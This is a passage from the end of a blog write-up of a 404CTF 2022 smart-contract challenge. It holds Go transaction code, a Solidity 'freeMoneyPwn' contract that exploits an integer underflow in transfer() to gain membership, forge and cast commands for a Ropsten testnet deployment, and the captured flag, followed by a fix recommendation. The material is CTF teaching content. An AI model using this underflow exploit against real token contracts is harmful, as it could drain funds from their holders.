</span></span><span class=line><span class=cl>		<span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=s>&#34;fail to get transfer &#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// EnterHallebarde
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// EnterHallebarde is a write transaction and therefore need to be signed
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>auth</span> <span class=p>=</span> <span class=nf>newTransactor</span><span class=p>(</span><span class=nx>client</span><span class=p>,</span> <span class=nx>privateKey</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>_</span><span class=p>,</span> <span class=nx>err</span> <span class=p>=</span> <span class=nx>instance</span><span class=p>.</span><span class=nf>EnterHallebarde</span><span class=p>(</span><span class=nx>auth</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=s>&#34;fail to enterHallebarde&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// newTransactor creates a transaction signer based on the provided private key
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>func</span> <span class=nf>newTransactor</span><span class=p>(</span><span class=nx>client</span> <span class=o>*</span><span class=nx>ethclient</span><span class=p>.</span><span class=nx>Client</span><span class=p>,</span> <span class=nx>privateKeyStr</span> <span class=kt>string</span><span class=p>)</span> <span class=o>*</span><span class=nx>bind</span><span class=p>.</span><span class=nx>TransactOpts</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>privateKey</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>crypto</span><span class=p>.</span><span class=nf>HexToECDSA</span><span class=p>(</span><span class=nx>privateKeyStr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>publicKey</span> <span class=o>:=</span> <span class=nx>privateKey</span><span class=p>.</span><span class=nf>Public</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=nx>publicKeyECDSA</span><span class=p>,</span> <span class=nx>ok</span> <span class=o>:=</span> <span class=nx>publicKey</span><span class=p>.(</span><span class=o>*</span><span class=nx>ecdsa</span><span class=p>.</span><span class=nx>PublicKey</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>!</span><span class=nx>ok</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=s>&#34;cannot assert type: publicKey is not of type *ecdsa.PublicKey&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>fromAddress</span> <span class=o>:=</span> <span class=nx>crypto</span><span class=p>.</span><span class=nf>PubkeyToAddress</span><span class=p>(</span><span class=o>*</span><span class=nx>publicKeyECDSA</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>nonce</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>client</span><span class=p>.</span><span class=nf>PendingNonceAt</span><span class=p>(</span><span class=nx>context</span><span class=p>.</span><span class=nf>Background</span><span class=p>(),</span> <span class=nx>fromAddress</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>gasPrice</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>client</span><span class=p>.</span><span class=nf>SuggestGasPrice</span><span class=p>(</span><span class=nx>context</span><span class=p>.</span><span class=nf>Background</span><span class=p>())</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=c1>//fmt.Println(&#34;gasPrice:&#34;, gasPrice)
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//fmt.Println(&#34;nonce:&#34;, nonce)
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>auth</span> <span class=o>:=</span> <span class=nx>bind</span><span class=p>.</span><span class=nf>NewKeyedTransactor</span><span class=p>(</span><span class=nx>privateKey</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>auth</span><span class=p>.</span><span class=nx>Nonce</span> <span class=p>=</span> <span class=nx>big</span><span class=p>.</span><span class=nf>NewInt</span><span class=p>(</span><span class=nb>int64</span><span class=p>(</span><span class=nx>nonce</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=nx>auth</span><span class=p>.</span><span class=nx>Value</span> <span class=p>=</span> <span class=nx>big</span><span class=p>.</span><span class=nf>NewInt</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>                                <span class=c1>// in wei
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>auth</span><span class=p>.</span><span class=nx>GasLimit</span> <span class=p>=</span> <span class=nb>uint64</span><span class=p>(</span><span class=mi>20000000</span><span class=p>)</span>                          <span class=c1>// in units
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>auth</span><span class=p>.</span><span class=nx>GasPrice</span> <span class=p>=</span> <span class=nb>new</span><span class=p>(</span><span class=nx>big</span><span class=p>.</span><span class=nx>Int</span><span class=p>).</span><span class=nf>Mul</span><span class=p>(</span><span class=nx>gasPrice</span><span class=p>,</span> <span class=nx>big</span><span class=p>.</span><span class=nf>NewInt</span><span class=p>(</span><span class=mi>3</span><span class=p>))</span> <span class=c1>// Increase gaz to improve speed as our guess depend of the block number
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>return</span> <span class=nx>auth</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Running the code should generate a revert with the message <strong>Soyez plus entreprenant !</strong>. This means, that we passed the first check that was <code>require(balances[msg.sender] > 100 ether || boss == msg.sender, "Vous n'avez pas assez d'argent pour devenir membre de Hallebarde.");</code>.</p><h3 id=second-condition>Second condition</h3><p>To bypass this check, we need to understand <strong>tx.origin</strong> and <strong>msg.sender</strong>. According to the <a class=link href=https://ethereum.org/en/whitepaper/#ethereum-accounts target=_blank rel=noopener>ethereum whitepaper</a>:</p><blockquote><p>In general, there are <strong>two types of accounts</strong>: <strong>externally owned accounts</strong>, controlled by private keys, and <strong>contract accounts</strong>, controlled by their contract code.</p></blockquote><ul><li><strong>tx.origin</strong> is the address of the <strong>externally owned accounts</strong> (or a wallet) that sent the transaction.</li><li><strong>msg.sender</strong> is the address of the account from which the call originated. It can be either an <strong>externally owned account</strong> or a <strong>contract account</strong>.</li></ul><p>By analogy with network address, <strong>tx.origin</strong> is like an IP address and <strong>msg.sender</strong> is like an <strong>arp address</strong>.</p><p>Thus, the condition <code>msg.sender != tx.origin</code> means that the transaction must come from a contract account. Basically, we have to do the previous part written in Golang in Solidity. :smile:.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>13</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;forge-std/Test.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// The interface defining the function in the vulnerable contract that we want to call
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>interface</span> <span class=nc>IFREE_MONEY</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>enterHallebarde</span><span class=p>()</span> <span class=k>external</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>transfer</span><span class=p>(</span><span class=kt>address</span> <span class=n>receiver</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>numTokens</span><span class=p>)</span> <span class=k>external</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>getMoney</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>numTokens</span><span class=p>)</span> <span class=k>external</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>getMembershipStatus</span><span class=p>(</span><span class=kt>address</span> <span class=n>memberAddress</span><span class=p>)</span> <span class=k>external</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>ContractTest</span> <span class=k>is</span> <span class=n>Test</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// The target contract
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>address</span> <span class=k>public</span> <span class=k>constant</span> <span class=n>FREE_MONEY_CONTRACT</span> <span class=o>=</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xb8c77090221FDF55e68EA1CB5588D812fB9f77D6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// setUp is a foundry function that is not needed here
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kd>function</span> <span class=nf>setUp</span><span class=p>()</span> <span class=k>public</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>freeMoneyPwn</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>IFREE_MONEY</span> <span class=n>fm</span> <span class=o>=</span> <span class=n>IFREE_MONEY</span><span class=p>(</span><span class=n>FREE_MONEY_CONTRACT</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// Call getMoney with 1 wei
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>fm</span><span class=p>.</span><span class=n>getMoney</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// Transfer 2 wei to a random address to trigger the underflow vulnerability
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>fm</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=mh>0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// EnterHallebarde
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>fm</span><span class=p>.</span><span class=n>enterHallebarde</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// Check if we are a member, otherwise revert
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nb>require</span><span class=p>(</span><span class=n>fm</span><span class=p>.</span><span class=n>getMembershipStatus</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>)),</span> <span class=s>&#34;Not in membership&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>I use <a class=link href=https://github.com/foundry-rs/foundry target=_blank rel=noopener>Foundry</a> introduce in the post <a class=link href=../setting-up-the-environment/>Setting up the environment</a>.</p><p>The above code can be tested on the fork with the command forge:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>forge run test/FreeMoney.t.sol --fork-url http://127.0.0.1:8545 --sig <span class=s2>&#34;freeMoneyPwn()&#34;</span> -vvvv
</span></span></code></pre></td></tr></table></div></div><p>No errors are returned. We can now deploy it on ropsten.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>forge create --rpc-url https://ropsten.infura.io/v3/&lt;API KEY&gt; --private-key &lt;PRIVATE KEY&gt; test/FreeMoney.t.sol:ContractTest
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>⠘<span class=o>]</span> Compiling...
</span></span><span class=line><span class=cl><span class=o>[</span>⠃<span class=o>]</span> Compiling <span class=m>2</span> files with 0.8.13
</span></span><span class=line><span class=cl><span class=o>[</span>⠢<span class=o>]</span> Compiling <span class=m>2</span> files with 0.6.12
</span></span><span class=line><span class=cl><span class=o>[</span>⠑<span class=o>]</span> Solc 0.6.12 finished in 155.95ms
</span></span><span class=line><span class=cl><span class=o>[</span>⠊<span class=o>]</span> Solc 0.8.13 finished in 2.56s
</span></span><span class=line><span class=cl>Compiler run successful
</span></span><span class=line><span class=cl>Deployer: 0xbafe3de2e4fbd28ce3d71db73b429cf13359f9e8
</span></span><span class=line><span class=cl>Deployed to: 0xbd5a2d122e606ba8e291db4da69fe879fed767e6
</span></span><span class=line><span class=cl>Transaction hash: 0xaf1231b3a5144264ac530f5409a5c68ce624c925792469ac29ee027893a66bcf
</span></span></code></pre></td></tr></table></div></div><p>And we can call the <code>freeMoneyPwn()</code> function:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cast send 0xbd5a2d122e606ba8e291db4da69fe879fed767e6 <span class=s2>&#34;freeMoneyPwn()&#34;</span> --rpc-url https://ropsten.infura.io/v3/&lt;API KEY&gt;  --private-key &lt;PRIVATE KEY&gt;
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>blockHash               0xfed145a41b6b0980fac1c04792951c68b800efcbb837eae7365fc8d87ee37a67
</span></span><span class=line><span class=cl>blockNumber             12281762
</span></span><span class=line><span class=cl>contractAddress
</span></span><span class=line><span class=cl>cumulativeGasUsed       833921
</span></span><span class=line><span class=cl>effectiveGasPrice       3000130589
</span></span><span class=line><span class=cl>gasUsed                 116832
</span></span><span class=line><span class=cl>logs                    []
</span></span><span class=line><span class=cl>logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
</span></span><span class=line><span class=cl>root
</span></span><span class=line><span class=cl>status                  1
</span></span><span class=line><span class=cl>transactionHash         0x3f26d603dc17454bd0fa0eb47c120b0e402c526ab1cda862694b53ea53f797ba
</span></span><span class=line><span class=cl>transactionIndex        6
</span></span><span class=line><span class=cl>type                    2
</span></span></code></pre></td></tr></table></div></div><p>We can use the contract address to validate the challenge:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>nc challenge.404ctf.fr 30885
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Si vous êtes un membre, appuyez sur entrée. Si vous êtes un VIP, rentrez votre pass :
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nous allons maintenant vérifier que vous êtes bien un membre.
</span></span><span class=line><span class=cl>Veuillez rentrer l&#39;adresse ethereum avec laquelle vous êtes membre :
</span></span><span class=line><span class=cl>0xbd5a2d122e606ba8e291db4da69fe879fed767e6
</span></span><span class=line><span class=cl>Vérification en cours ...
</span></span><span class=line><span class=cl>Bonjour membre, voici la preuve définitive que vous faites partie de Hallebarde :
</span></span><span class=line><span class=cl>404CTF{5M4r7_C0N7r4C7_1NC3P710N_37_UND3rF10W_QU01_D3_P1U5_F4C113}
</span></span><span class=line><span class=cl>Faites attention, elle ne vous sera délivrée qu&#39;une fois, ne la perdez pas !
</span></span></code></pre></td></tr></table></div></div><p>The golang part was not necessary, but I wanted to show you how to use <strong>golang</strong> to interact with the contract.</p><h2 id=recommendation>Recommendation</h2><p>To avoid such vulnerabilities, the safeMath library or the 0.8 branch of the solidity compiler should be used and the <code>transfer()</code> function should implement the appropriate <code>require</code> function.</p></section><footer class=article-footer><section class=article-tags><a href=/tags/foundry/>foundry</a>
<a href=/tags/solidity/>solidity</a>
<a href=/tags/golang/>golang</a>
<a href=/tags/web3/>web3</a></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/writeup-404ctf-2022-public-key-web3/><div class=article-image><img src=/images/404CTF.png loading=lazy data-key data-hash=/images/404CTF.png></div><div class=article-details><h2 class=article-title>Writeup 404CTF 2022 - public key (web3)</h2></div></a></article><article class=has-image><a href=/p/writeup-404ctf-2022-contracts-war-2-web3/><div class=article-image><img src=/images/404CTF.png loading=lazy data-key data-hash=/images/404CTF.png></div><div class=article-details><h2 class=article-title>Writeup 404CTF 2022 - Contracts war 2 (web3)</h2></div></a></article><article class=has-image><a href=/p/ethernaut-challenges/><div class=article-image><img src=/images/openzeppelin-logo.svg loading=lazy data-key data-hash=/images/openzeppelin-logo.svg></div><div class=article-details><h2 class=article-title>Ethernaut challenges</h2></div></a></article><article class=has-image><a href=/p/ethernaut-challenges-0.-hello-ethernaut/><div class=article-image><img src=/images/openzeppelin-logo.svg loading=lazy data-key data-hash=/images/openzeppelin-logo.svg></div><div class=article-details><h2 class=article-title>Ethernaut challenges - 0. Hello Ethernaut</h2></div></a></article><article class=has-image><a href=/p/ethernaut-challenges-1.-fallback/><div class=article-image><img src=/images/openzeppelin-logo.svg loading=lazy data-key data-hash=/images/openzeppelin-logo.svg></div><div class=article-details><h2 class=article-title>Ethernaut challenges - 1. Fallback</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2022 Nodauf</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.12.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#statement>Statement</a></li><li><a href=#exploitation>Exploitation</a><ol><li><a href=#first-condition>First condition</a></li><li><a href=#second-condition>Second condition</a></li></ol></li><li><a href=#recommendation>Recommendation</a></li></ol></nav></div></section></aside></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>